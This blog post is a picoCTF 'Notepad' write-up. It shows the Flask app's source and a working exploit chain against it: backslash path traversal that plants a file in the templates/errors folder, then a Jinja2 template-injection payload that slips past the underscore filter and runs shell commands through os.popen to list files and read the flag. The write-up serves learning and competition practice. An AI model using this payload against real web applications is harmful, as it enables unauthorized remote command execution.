<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>Notepad - lavafroth</title><meta name=description content='At first glance the webapp looks like a stripped down version of Pastebin where we can post a text / code snippet.
After submitting the query, we are redirected to an html page containing the content of the post.
The first thing I tried was triggering XSS (cross site scripting) with the following:
<script>alert(1)</script>
The application source directory tree looks like the following:
.
├── app.py
├── Dockerfile
├── flag.txt
├── static
└── templates
    ├── errors
    │   ├── bad_content.html
    │   └── long_content.html
    └── index.html
Let&rsquo;s inspect the app.py source.'><meta name=author content><link rel="preload stylesheet" as=style href=https://lavafroth.is-a.dev/app.min.css><link rel=preload as=image href=../../header.svg><link as=font href=https://lavafroth.is-a.dev/latinmodern-math.otf><link rel=preload as=image href=https://lavafroth.is-a.dev/github.svg><link rel=preload as=image href=https://lavafroth.is-a.dev/about.svg><link rel=preload as=image href=https://lavafroth.is-a.dev/art.svg><link rel=icon href=https://lavafroth.is-a.dev/favicon.png><link rel=blog-icon href=https://lavafroth.is-a.dev/icon.png></head><body data-menu=true><header class=header><h1><a class=site-name href=https://lavafroth.is-a.dev/><svg viewBox="0 0 8790 2400"><path d="M80 1935V465h216v1270h286v2e2zm853 0 222-1470h264l222 1470h-210l-40-3e2h-208l-40 3e2zm280-528h148l-62-494-6-78h-12l-6 78zm1025 528L2014 465h210l108 868 8 142h12l8-142 108-868h210l-224 1470zm813 0 222-1470h264l222 1470h-210l-40-3e2h-208l-40 3e2zm280-528h148l-62-494-6-78h-12l-6 78zm851 528V465h514v222h-298v386h2e2v222h-2e2v640zm910 0V465h216q194 0 286 108 92 107 92 316 0 124-43 215-44 90-106 132l147 699h-216l-122-620h-38v620zm216-820q60 0 95-26 35-27 50-76t15-116q0-105-34-161-35-57-126-57zm1084 836q-90 0-154-42-65-42-99-114-35-72-35-162V767q0-91 35-162 34-72 99-114 64-42 154-42t155 42q64 42 99 114 34 72 34 162v866q0 90-34 162-35 72-99 114-65 42-155 42zm0-210q40 0 56-33 16-34 16-75V767q0-41-17-74-17-34-55-34-37 0-54 34-18 33-18 74v866q0 41 17 75 17 33 55 33zm890 194V687h-204V465h624v222h-204v1248zm828 0V465h216v608h168V465h216v1470h-216v-640h-168v640z"/></svg></a></h1><div class=push></div><a style=--url:url(./github.svg) href=https://github.com/lavafroth aria-label=github target=_blank></a><a href=../../about/ aria-label=about style=--url:url(./about.svg)></a><a href=../../art/ aria-label=art style=--url:url(./art.svg)></a></header><main class=main><article class=post-single><header class=post-title><p><time>Feb 21, 2022 | 3 minutes read</time></p><h1 data-pagefind-meta=title>Notepad</h1></header><section class=post-content data-pagefind-body><p>At first glance the webapp looks like a stripped down version of Pastebin where we can post a text / code snippet.
After submitting the query, we are redirected to an html page containing the content of the post.</p><p>The first thing I tried was triggering XSS (cross site scripting) with the following:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>script</span>&gt;<span style=color:#a6e22e>alert</span>(<span style=color:#ae81ff>1</span>)&lt;/<span style=color:#f92672>script</span>&gt;
</span></span></code></pre></div><p>The application source directory tree looks like the following:</p><pre tabindex=0><code>.
├── app.py
├── Dockerfile
├── flag.txt
├── static
└── templates
    ├── errors
    │   ├── bad_content.html
    │   └── long_content.html
    └── index.html
</code></pre><p>Let&rsquo;s inspect the <code>app.py</code> source.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> werkzeug.urls <span style=color:#f92672>import</span> url_fix
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> secrets <span style=color:#f92672>import</span> token_urlsafe
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> Flask, request, render_template, redirect, url_for
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>app <span style=color:#f92672>=</span> Flask(__name__)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#34;/&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>index</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#34;index.html&#34;</span>, error<span style=color:#f92672>=</span>request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;error&#34;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#34;/new&#34;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#34;POST&#34;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>create</span>():
</span></span><span style=display:flex><span>    content <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;content&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;_&#34;</span> <span style=color:#f92672>in</span> content <span style=color:#f92672>or</span> <span style=color:#e6db74>&#34;/&#34;</span> <span style=color:#f92672>in</span> content:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> redirect(url_for(<span style=color:#e6db74>&#34;index&#34;</span>, error<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;bad_content&#34;</span>))
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> len(content) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>512</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> redirect(url_for(<span style=color:#e6db74>&#34;index&#34;</span>, error<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;long_content&#34;</span>, len<span style=color:#f92672>=</span>len(content)))
</span></span><span style=display:flex><span>    name <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;static/</span><span style=color:#e6db74>{</span>url_fix(content[:<span style=color:#ae81ff>128</span>])<span style=color:#e6db74>}</span><span style=color:#e6db74>-</span><span style=color:#e6db74>{</span>token_urlsafe(<span style=color:#ae81ff>8</span>)<span style=color:#e6db74>}</span><span style=color:#e6db74>.html&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>with</span> open(name, <span style=color:#e6db74>&#34;w&#34;</span>) <span style=color:#66d9ef>as</span> f:
</span></span><span style=display:flex><span>        f<span style=color:#f92672>.</span>write(content)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> redirect(name)
</span></span></code></pre></div><p>Ok, so the application returns the <code>bad_content</code> message when it sees a slash or an underscore.
However, we can notice that an attacker has partial control over the error message template.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#34;/&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>index</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#34;index.html&#34;</span>, error<span style=color:#f92672>=</span>request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;error&#34;</span>))
</span></span></code></pre></div><p>The content we post gets uploaded to the static directory and the filename consists of the first 128 characters of the content, a hyphen and an 8 character url-safe random token.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>name <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;static/</span><span style=color:#e6db74>{</span>url_fix(content[:<span style=color:#ae81ff>128</span>])<span style=color:#e6db74>}</span><span style=color:#e6db74>-</span><span style=color:#e6db74>{</span>token_urlsafe(<span style=color:#ae81ff>8</span>)<span style=color:#e6db74>}</span><span style=color:#e6db74>.html&#34;</span>
</span></span></code></pre></div><p>So, we can upload a valid Jinja2 template to errors directory, then use the filename in the error parameter tp render it through Jinja.</p><p>We can use a backslash instead of a forward slash along with double periods (<code>..</code>) for path traversal. From the static directory we&rsquo;ll go:</p><table><thead><tr><th>path</th><th>explanation</th></tr></thead><tbody><tr><td><code>..</code></td><td>up to the root of the app</td></tr><tr><td><code>..\templates\</code></td><td>into templates</td></tr><tr><td><code>..\templates\errors\</code></td><td>then into errors</td></tr></tbody></table><p>We&rsquo;ll fill the remainder of the first 128 characters of the content to <code>A</code>s so that the filename does not get messed up.
Next up, using the right payload. I picked the following up from PayloadAllTheThings</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>{{ cycler<span style=color:#f92672>.</span><span style=color:#a6e22e>__init__</span><span style=color:#f92672>.</span>__globals__<span style=color:#f92672>.</span>os<span style=color:#f92672>.</span>popen(<span style=color:#e6db74>&#39;id&#39;</span>)<span style=color:#f92672>.</span>read() }}
</span></span></code></pre></div><p>We have to bypass the underscores and it would be better if we could control the command.
The command can be passed through a request parameter and so can the underscore be.
We&rsquo;ll pass the underscore to the parameter <code>u</code> and retrieve it in the template using <code>request.args.u</code>.
Similarly, we&rsquo;d retrieve the command <code>c</code> using <code>request.args.c</code>.</p><p>So</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>cycler<span style=color:#f92672>.</span><span style=color:#a6e22e>__init__</span><span style=color:#f92672>.</span>__globals__
</span></span></code></pre></div><p>becomes</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>cycler[request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>u<span style=color:#f92672>*</span><span style=color:#ae81ff>2</span><span style=color:#f92672>+</span><span style=color:#e6db74>&#39;init&#39;</span><span style=color:#f92672>+</span>request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>u<span style=color:#f92672>*</span><span style=color:#ae81ff>2</span>][request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>u<span style=color:#f92672>*</span><span style=color:#ae81ff>2</span><span style=color:#f92672>+</span><span style=color:#e6db74>&#39;globals&#39;</span><span style=color:#f92672>+</span>request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>u<span style=color:#f92672>*</span><span style=color:#ae81ff>2</span>]
</span></span></code></pre></div><p>Putting it all together, we have:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>..</span>\templates\errors\AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></span><span style=display:flex><span>{{cycler[request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>u<span style=color:#f92672>*</span><span style=color:#ae81ff>2</span><span style=color:#f92672>+</span><span style=color:#e6db74>&#39;init&#39;</span><span style=color:#f92672>+</span>request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>u<span style=color:#f92672>*</span><span style=color:#ae81ff>2</span>][request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>u<span style=color:#f92672>*</span><span style=color:#ae81ff>2</span><span style=color:#f92672>+</span><span style=color:#e6db74>&#39;globals&#39;</span><span style=color:#f92672>+</span>request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>u<span style=color:#f92672>*</span><span style=color:#ae81ff>2</span>]<span style=color:#f92672>.</span>os<span style=color:#f92672>.</span>popen(request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>c)<span style=color:#f92672>.</span>read()}}
</span></span></code></pre></div><p>Note the <code>request.args.c</code> passed to <code>os.popen</code> for the commands we would run.</p><p>After uploading the payload we are rediected to a not found page.</p><p><a href=https://notepad.mars.picoctf.net/templates/errors/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA-xcdn7y8bhU0.html>https://notepad.mars.picoctf.net/templates/errors/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA-xcdn7y8bhU0.html</a></p><p>Let&rsquo;s now cause the app render our custom <em>&ldquo;error&rdquo;</em> page. We&rsquo;ll also set the get parameter <code>u</code> to <code>_</code> and <code>c</code> to the command to run.</p><p><a href="https://notepad.mars.picoctf.net/?errors=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA-xcdn7y8bhU0&amp;u=_&amp;c=COMMAND">https://notepad.mars.picoctf.net/?errors=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA-xcdn7y8bhU0&u=_&c=COMMAND</a></p><p>Setting <code>c</code> to the <code>ls</code> command, we get:</p><pre tabindex=0><code class=language-none data-lang=none>app.py
flag-c8f5526c-4122-4578-96de-d7dd27193798.txt
static
templates
</code></pre><p>Let&rsquo;s view the flag file. We&rsquo;ll set <code>c</code> to <code>cat%20flag-c8f5526c-4122-4578-96de-d7dd27193798.txt</code></p><p>There&rsquo;s our flag!</p><pre tabindex=0><code>picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}
</code></pre></section></article><footer class=post-tags data-pagefind-meta=tags><a href=https://lavafroth.is-a.dev/tags/ctf class=list-tag>CTF</a>
<a href=https://lavafroth.is-a.dev/tags/jinja2 class=list-tag>Jinja2</a>
<a href=https://lavafroth.is-a.dev/tags/path-traversal class=list-tag>Path Traversal</a>
<a href=https://lavafroth.is-a.dev/tags/picoctf class=list-tag>PicoCTF</a>
<a href=https://lavafroth.is-a.dev/tags/python class=list-tag>Python</a>
<a href=https://lavafroth.is-a.dev/tags/web class=list-tag>Web</a></footer><nav class=post-nav><a class=prev href=https://lavafroth.is-a.dev/post/liberating-14gib-of-space/><span>←</span><span>Liberating 14GiB of disk space</span></a>
<a class=next href=https://lavafroth.is-a.dev/post/gadgeting-in-python-jails/><span>Gadgeting in Python Jails</span><span>→</span></a></nav></main><footer class=footer><p>&copy; 2025 <a href=https://lavafroth.is-a.dev/>lavafroth</a></p><p><a href=https://github.com/lavafroth/lavafroth.github.io/issues/new/choose>Report an issue</a></p><p><a href=https://github.com/lavafroth/lavafroth.github.io/discussions/>Discuss</a></p><p><a href=https://lavafroth.is-a.dev/privacy>Privacy</a></p><p><a href=https://creativecommons.org/licenses/by-sa/4.0/legalcode>License</a></p></footer></body></html>